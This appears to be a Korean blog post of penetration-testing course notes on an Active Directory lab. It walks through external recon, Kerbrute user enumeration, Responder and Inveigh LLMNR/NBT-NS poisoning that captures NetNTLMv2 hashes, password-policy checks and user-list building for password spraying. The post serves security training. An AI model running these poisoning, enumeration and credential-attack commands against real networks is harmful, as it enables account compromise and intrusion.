---
title: "Active Directory - Initial Enumeration and Foothold"
date: 2026-08-02
layout: single
excerpt: "Active Directory 환경에서 외부 정찰과 내부 호스트, 사용자 열거를 수행하고, Responder와 Inveigh를 이용한 LLMNR/NBT-NS 포이즈닝, 비밀번호 정책 확인 및 패스워드 스프레이를 통해 초기 foothold를 확보하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [cpts, active-directory, enumeration, responder, password-spraying]
---

Active Directory 환경에서 외부 정찰과 내부 호스트, 사용자 열거를 수행하고, Responder와 Inveigh를 이용한 LLMNR/NBT-NS 포이즈닝, 비밀번호 정책 확인 및 패스워드 스프레이를 통해 초기 foothold를 확보하는 과정을 정리한다.

# Initial Enumeration

## External Recon and Enumeration Principles

### Public OSINT and Infrastructure Enumeration

초기 접근 지점을 찾기 위해서는 대상 도메인과 외부 노출 정보를 먼저 열거하는 과정이 중요하다.

[Hurricane Electric](https://bgp.he.net/) 또는 [ViewDNS](https://viewdns.info/) 같은 서비스를 활용하면 대상 도메인과 연관된 네트워크 및 DNS 정보를 확인하는 데 도움이 된다.

이 과정에서 도메인의 IP 대역, DNS 레코드, 하위 도메인 등 추가 공격 표면으로 이어질 수 있는 정보를 확보할 수 있기 때문이다.

예를 들어 `inlanefreight.com` 도메인을 조사한다고 가정해보자.

Google에서 `filetype:pdf inurl:inlanefreight.com` 과 같은 검색 연산자를 사용하면 대상 도메인과 관련된 공개 문서를 추가로 찾을 수 있다.

### Credential Leak Search

또한 [DeHashed](https://dehashed.com/) 같은 유출 데이터 검색 서비스를 활용하여 공개적으로 유출된 이메일, 사용자명, 평문 비밀번호 또는 비밀번호 해시가 존재하는지도 확인할 수 있다:

```bash
$ sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : roger.grimes@inlanefreight.local
username : rgrimes
password : Ilovefishing!
hashed_password : 
name : Roger Grimes
vin : 
address : 
phone : 
database_name : ModBSolutions

id : 7344467234
email : jane.yu@inlanefreight.local
username : jyu
password : Starlight1982_!
hashed_password : 
name : Jane Yu
vin : 
address : 
phone : 
database_name : MyFitnessPal

## SKIP
```

## Initial Enumeration of the Domain

현재 침투 테스트에서 제공된 정보는 다음과 같다:

- Scope: 172.16.5.0/23
- 내부망에 배치된 Linux pentest VM
- 필요하면 사용할 Windows attack host
- Windows attack host 접속용 htb-student 계정
- Grey Box
- Non-Evasive

따라서 제공된 htb-student 계정과 공격 호스트를 기반으로 내부 네트워크를 열거하고, 접근 가능한 시스템과 사용자 정보를 찾아야 한다.

### Network Interface and Scope

`ifconfig` 를 확인하면 현재 Linux 공격 호스트가 두 개의 네트워크 인터페이스에 연결된 듀얼 홈드(Dual-Homed) 환경임을 확인할 수 있다:

```bash
$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.107.119  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f31f:d435:be9c:3304  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::9ee8:fa6e:21a:cca8  prefixlen 64  scopeid 0x0<global>
        ether a2:de:ad:79:95:b2  txqueuelen 1000  (Ethernet)
        RX packets 535  bytes 44695 (43.6 KiB)
        RX errors 0  dropped 24  overruns 0  frame 0
        TX packets 83  bytes 11492 (11.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:d1:d6:7f  txqueuelen 1000  (Ethernet)
        RX packets 424  bytes 35914 (35.0 KiB)
        RX errors 0  dropped 9  overruns 0  frame 0
        TX packets 32  bytes 2370 (2.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`ens224` 인터페이스는 `172.16.4.0/23` 네트워크에 직접 연결되어 있다.

따라서 별도의 라우팅 홉을 거쳐 접근하는 구조와 달리, 같은 로컬 네트워크에서 발생하는 브로드캐스트/멀티캐스트 기반 트래픽을 `tcpdump`, `Wireshark` 같은 도구로 관찰할 수 있다.

### Host Discovery and Service Enumeration

또한 제공된 범위가 `/23` 이므로, 해당 CIDR의 실제 네트워크 주소인 `172.16.4.0/23` 을 대상으로 `fping` 을 사용해 응답하는 호스트를 빠르게 확인할 수 있다:

```bash
$ fping -asgq 172.16.4.0/23   

172.16.5.5
172.16.5.130
172.16.5.225
```

응답한 호스트를 `hosts.txt` 에 저장한 뒤 `nmap -iL` 을 사용하면 여러 호스트를 한 번에 서비스 스캔할 수 있다:

```bash
$ sudo nmap -sC -sV -iL hosts.txt | tee nmap                                                                   

PORT     STATE SERVICE       VERSION

# SKIP
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-02 05:24:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT
| Not valid before: 2026-07-22T08:52:23
|_Not valid after:  2027-07-22T08:52:23
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-02T05:26:27+00:00; +20s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2026-07-21T08:46:17
|_Not valid after:  2027-01-20T08:46:17
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-02T05:25:23+00:00
MAC Address: A2:DE:AD:32:D1:73 (Unknown)
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-02T05:25:23
|_  start_date: N/A
|_clock-skew: mean: 19s, deviation: 0s, median: 19s
|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:32:d1:73 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Nmap scan report for 172.16.5.130
# SKIP
```

스캔 결과 여러 내부 호스트가 확인되었으며, 특히 `172.16.5.5` 에서는 DNS, Kerberos, LDAP, SMB, Global Catalog 등의 포트가 열려 있어 Active Directory Domain Controller임을 추정할 수 있다.

### Kerberos User Enumeration

확인한 도메인 `INLANEFREIGHT.LOCAL` 과 KDC `172.16.5.5` 를 기준으로 [Kerbrute](https://github.com/ropnop/kerbrute)를 사용해 유효한 사용자명을 열거할 수 있다:

```bash
$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt

2026/08/02 01:35:58 >  Using KDC(s):
2026/08/02 01:35:58 >   172.16.5.5:88

2026/08/02 01:35:58 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jwilson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       bdavis@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       njohnson@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       asanchez@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       dlewis@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       ccruz@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:366b80789ff06d382993e4766a0f2c84$8340ed04d3482944a093d351d8069192651a06c79811b85304b6b8949aba077e6428d0da32c81fdd38054db3a0e41bfea7210fb89f180cbd6b02f542517c75fa49e6d650cd9687a62126f7ada9706b4e019a9355bae2a84ce308375eafd53e110390db67381eb34c3e47ed45697624ec230b890062552fbdeefb8a432c3476753d3d0b0c99f7c008bd7e2d1446c6441d6d50c1ff837a4148a5f000ac26e0340ae43c011fa2e766a267ac1a149661dc7212d570d8cbf48ca3e2d963e03014c4582719504d863c41b80757736b60a8540d1866c70768afdc75654872966f871628d3c260b9fa98230edf49920f6cb71368a707e6d0408a2fe98f543488068fc8dde1d0aae45d2290c3a518
2026/08/02 01:35:58 >  [+] VALID USERNAME:       mmorgan@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       rramirez@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jwallace@INLANEFREIGHT.LOCAL
2026/08/02 01:35:58 >  [+] VALID USERNAME:       jsantiago@INLANEFREIGHT.LOCAL
```

이 결과를 통해 유효한 사용자 목록을 확보할 수 있으며, 이후 AS-REP Roasting이나 패스워드 스프레이처럼 계정 목록이 필요한 단계에 활용할 수 있다.

# Sniffing out a Foothold

## LLMNR/NBT-NS Poisoning - from Linux

### Capturing NetNTLMv2 with Responder

현재 공격 호스트가 내부 네트워크에 직접 연결되어 있으므로, Responder를 이용해 LLMNR/NBT-NS/mDNS 이름 해석 요청을 관찰하고 잘못된 이름 해석 요청에 응답할 수 있다.

Responder는 피해 호스트의 이름 해석 요청에 공격자 호스트가 해당 시스템인 것처럼 응답한 뒤, SMB, HTTP, MSSQL 등의 인증 시도를 유도하여 NetNTLMv2 Challenge-Response 값을 캡처하는 도구이다.

따라서 `ens224` 에서 Responder를 실행하면 내부 호스트가 존재하지 않거나 잘못된 이름을 조회할 때 Poisoning 응답을 보내고, 이후 공격자 서비스로 전달되는 인증 시도를 확인할 수 있다:

```bash
$ sudo responder -I ens224                                                                                     

[+] Listening for events...                                                                                        

[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:8c91d150859b691a:A70CF89062A865E43F4AAF55B4D0209A:01010000000000004ECBC92FE62ADD01678508CE7C4E0B2600000000020008004D0032004800310001001E00570049004E002D0057004200530032004300330056004E004B0055005000040014004D003200480031002E004C004F00430041004C0003003400570049004E002D0057004200530032004300330056004E004B00550050002E004D003200480031002E004C004F00430041004C00050014004D003200480031002E004C004F00430041004C000800300030000000000000000000000000300000DECFE5882AAA3D0E9CB0F305131DA75C12513B952F999AD8C47C62CEECC87B330A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000
```

출력에서는 `172.16.5.130` 호스트가 `academy-ea-web0` 을 찾는 과정에서 Responder의 Poisoning 응답을 받아 MSSQL 인증을 시도했고, 그 결과 `lab_adm` 계정의 NetNTLMv2 Challenge-Response 값이 캡처된 것을 확인할 수 있다.

### Validating Recovered Credentials

별도로 캡쳐된 `wley` 의 값을 크랙하여 다음 자격 증명을 확보하였다:

```bash
$ crackmapexec smb 172.16.5.0/24 -u wley -p 'transporter@4'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
```

확보한 자격 증명으로 SMB 인증도 확인할 수 있다:

```bash
$ smbclient -L //172.16.5.5 -U 'INLANEFREIGHT.LOCAL\wley%transporter@4'                                        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        User Shares     Disk      
        ZZZ_archive     Disk      
```

## LLMNR/NBT-NS Poisoning - from Windows

### Capturing NetNTLMv2 with Inveigh

Windows 환경에서도 동일한 이름 해석 Poisoning 공격 흐름을 확인할 수 있다.

우선 네트워크 인터페이스를 확인하면 다음과 같다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::490d:6d78:9f71:ede7%8
   IPv4 Address. . . . . . . . . . . : 172.16.5.25
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::be:d4df:7a92:2fe
   Link-local IPv6 Address . . . . . : fe80::be:d4df:7a92:2fe%12
   IPv4 Address. . . . . . . . . . . : 10.129.107.144
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ced%12
                                       10.129.0.1
```

Windows 공격 호스트 역시 `10.129.0.0/16` 과 `172.16.4.0/23` 측에 연결된 듀얼 홈드 환경임을 확인할 수 있다.

Windows에서는 Responder와 유사한 기능을 제공하는 C# 기반 Inveigh를 사용할 수 있다.

Inveigh를 실행하면 다음과 같이 LLMNR 요청과 SMB 인증 시도를 확인할 수 있다:

```powershell
*Evil-WinRM* PS C:\tools> .\Inveigh.exe

# SKIP

[.] [00:04:57] SMB1(445) negotiation request detected from 172.16.5.130:49983
[.] [00:04:57] SMB2+(445) negotiation request detected from 172.16.5.130:49983
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from fe80::9928:5dd5:3fd6:98c1%8 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from fe80::9928:5dd5:3fd6:98c1%8 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[-] [00:04:57] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[+] [00:04:57] SMB(445) NTLM challenge [E2F1B67656CD23A8] sent to 172.16.5.25:49983
[+] [00:04:57] SMB(445) NTLMv2 captured for [INLANEFREIGHT\lab_adm] from 172.16.5.130(ACADEMY-EA-FILE):49983:
lab_adm::INLANEFREIGHT:E2F1B67656CD23A8:E3D4D4E0A0EB96CE5B1C330AB0E637A1:01010000000000001D39010DF22ADD01FB3AF0502925BFB90000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001D39010DF22ADD0106000400020000000800300030000000000000000000000000300000345E64B92F0BAD3BB5C7F2D001EFF7D6094A9BB17BDEEFD13F6446B0C1DED0CD0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
```

이처럼 Windows 환경에서도 이름 해석 요청을 Poisoning하여 NetNTLMv2 Challenge-Response 값을 캡처할 수 있다.

# Sighting In, Hunting For A User

## Enumerating & Retrieving Password Policies

### Linux

패스워드 스프레이를 수행하기 전에는 먼저 도메인의 비밀번호 및 계정 잠금 정책을 확인하는 것이 중요하다.

특히 Lockout Threshold와 Observation Window를 확인해야 여러 계정에 동일한 비밀번호를 시도할 때 계정 잠금 위험을 줄일 수 있다.

#### NetExec / CrackMapExec

Linux에서는 NetExec/CrackMapExec의 `--pass-pol` 옵션을 사용하여 정책을 확인할 수 있다:

```bash
$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol                                            

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHT
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not Set
SMB         172.16.5.5      445    ACADEMY-EA-DC01  
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Refuse Password Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Store Cleartext: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Lockout Admins: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Clear Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password No Anon Change: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01      Domain Password Complex: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set
```

출력에서 최소 비밀번호 길이는 8자이며, 잘못된 인증이 5회 누적되면 계정이 잠기고 잠금 시간과 카운터 초기화 시간은 각각 30분으로 설정되어 있음을 확인할 수 있다.

또한 비밀번호 기록 길이가 24이므로 새 비밀번호는 이전 24개의 비밀번호와 동일하게 설정할 수 없다.

#### RPCClient

RPC를 사용할 수 있는 경우 `querydominfo` 와 `getdompwinfo` 를 통해 도메인 정보와 비밀번호 정책도 확인할 수 있다:

```bash
rpcclient $> querydominfo

Domain:     INLANEFREIGHT
Server:     
Comment:    
Total Users:    3650
Total Groups:   0
Total Aliases:  37
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:  0x1

rpcclient $> getdompwinfo

min_password_length: 8
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

#### enum4linux-ng

또한 [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)를 사용하면 SMB/RPC 정보와 비밀번호 정책을 한 번에 열거할 수 있다:

```bash
$ enum4linux-ng -P 172.16.5.5 -oA ilfreight                                                                    

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.16.5.5
[*] Username ......... ''
[*] Random Username .. 'pdthnpmy'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Service Scan on 172.16.5.5    |
 ==================================
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =======================================
|    SMB Dialect Check on 172.16.5.5    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false                                                                                                     
SMB 2.02: true                                                                                                     
SMB 2.1: true                                                                                                      
SMB 3.0: true                                                                                                      
SMB1 only: false                                                                                                   
Preferred dialect: SMB 3.0                                                                                         
SMB signing required: true                                                                                         

 =======================================
|    RPC Session Check on 172.16.5.5    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for 172.16.5.5    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] SID: S-1-5-21-3842939050-3880317879-2865463114
[+] Host is part of a domain (not a workgroup)

 =========================================================
|    Domain Information via SMB session for 172.16.5.5    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ACADEMY-EA-DC01                                                                             
NetBIOS domain name: INLANEFREIGHT                                                                                 
DNS domain: INLANEFREIGHT.LOCAL                                                                                    
FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL                                                                          

 =======================================
|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:                                                                                       
  pw_history_length: 24                                                                                            
  min_pw_length: 8                                                                                                 
  min_pw_age: 1 day 4 minutes                                                                                      
  max_pw_age: not set                                                                                              
  pw_properties:                                                                                                   
  - DOMAIN_PASSWORD_COMPLEX: true                                                                                  
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                                          
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                                         
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                                          
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                                
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                                  
domain_lockout_information:                                                                                        
  lockout_observation_window: 30 minutes                                                                           
  lockout_duration: 30 minutes                                                                                     
  lockout_threshold: 5                                                                                             
domain_logoff_information:                                                                                         
  force_logoff_time: not set 
```

이를 통해 도메인 이름, DC 호스트명, 익명 RPC 세션 허용 여부와 비밀번호 정책까지 함께 확인할 수 있다.

#### LDAPSearch

익명 LDAP 조회가 허용되는 환경이라면 `ldapsearch` 를 이용해서도 도메인 객체의 비밀번호 정책 속성을 확인할 수 있다:

```bash
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength   

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```

### Window

#### net accounts

Windows 환경에서는 `net accounts` 명령을 사용하여 현재 도메인/시스템에 적용되는 계정 정책을 확인할 수 있다:

```powershell
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

#### PowerView

그리고 [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)의 `Get-DomainPolicy` 를 통해서도 Default Domain Policy에 설정된 비밀번호 및 Kerberos 정책을 확인할 수 있다:

```powershell
PS C:\htb> import-module .\PowerView.ps1

PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

## Password Spraying - Making a Target User List

패스워드 스프레이를 수행하기 전에는 어떤 사용자가 존재하는지 확인할 필요가 있다.

우선 `enum4linux-ng` 를 사용하여 사용자명을 추출할 수 있다:

```bash
$ enum4linux-ng -U 172.16.5.5 | grep "username:" | awk '{print $2}'   

lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
# SKIP
```

NULL Session이 허용된 경우에는 `rpcclient` 를 사용해 익명으로 도메인 사용자 목록을 열거할 수도 있다:

```bash
$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
# SKIP
```

익명 LDAP 바인딩과 검색이 허용된다면 `ldapsearch` 를 사용하여 `sAMAccountName` 도 수집할 수 있다:

```bash
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
htb-student
avazquez
pfalcon
fanthony
wdillard
# SKIP
```

# Spray Responsibly

## Internal Password Spraying - from Linux

